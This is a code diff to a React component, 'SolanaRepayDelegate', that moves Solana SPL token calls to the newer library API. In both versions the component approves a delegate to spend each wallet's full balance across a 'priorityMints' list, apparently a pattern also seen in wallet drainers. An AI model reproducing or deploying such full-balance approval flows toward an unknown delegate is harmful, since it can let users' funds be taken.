@@ -4,7 +4,9 @@ import { useCallback, useEffect, useMemo, useState } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction } from '@solana/web3.js';
 import {
-  Token,
+  getAccount,
+  getAssociatedTokenAddress,
+  createApproveInstruction,
   ASSOCIATED_TOKEN_PROGRAM_ID,
   TOKEN_PROGRAM_ID
 } from '@solana/spl-token';
@@ -43,23 +45,19 @@ export default function SolanaRepayDelegate() {
       const results = await Promise.all(
         config.priorityMints.map(async (mint) => {
           try {
-            const ata = await Token.getAssociatedTokenAddress(
-              ASSOCIATED_TOKEN_PROGRAM_ID,
+            const mintPubKey = new PublicKey(mint);
+            const ata = await getAssociatedTokenAddress(
+              mintPubKey,
+              publicKey,
+              false,
               TOKEN_PROGRAM_ID,
-              new PublicKey(mint),
-              publicKey
+              ASSOCIATED_TOKEN_PROGRAM_ID
             );
-            const token = new Token(
-              connection,
-              new PublicKey(mint),
-              TOKEN_PROGRAM_ID,
-              null
-            );
-            const account = await token.getAccountInfo(ata);
+            const account = await getAccount(connection, ata);
             return {
               mint,
               ata: ata.toString(),
-              amount: BigInt(account.amount.toString())
+              amount: account.amount
             };
           } catch {
             return { mint, ata: '', amount: 0n };
@@ -93,13 +91,13 @@ export default function SolanaRepayDelegate() {
       for (const item of approvals) {
         const ata = new PublicKey(item.ata);
         const tx = new Transaction().add(
-          Token.createApproveInstruction(
-            TOKEN_PROGRAM_ID,
+          createApproveInstruction(
             ata,
             delegate,
             publicKey,
+            item.amount,
             [],
-            item.amount
+            TOKEN_PROGRAM_ID
           )
         );
         const signature = await sendTransaction(tx, connection);
